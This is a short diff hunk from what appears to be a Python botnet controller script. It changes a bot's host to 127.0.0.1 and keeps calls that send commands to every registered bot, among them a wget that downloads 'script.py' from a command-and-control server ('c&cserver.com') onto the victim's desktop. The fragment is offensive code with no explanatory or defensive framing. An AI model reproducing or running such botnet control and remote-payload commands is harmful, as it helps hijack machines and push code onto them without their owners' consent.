@@ -36,6 +36,6 @@ def add_bot(host, user, password):
     new_bot = Bot(host, user, password)
     botnet.append(new_bot)
 
-add_bot('{HOST IP}', '', '')
+add_bot('127.0.0.1', '', '')
 command_bots('ls')
 command_bots("""wget -O /Users/Admin/Desktop/ "http://c&cserver.com/script.py"""")
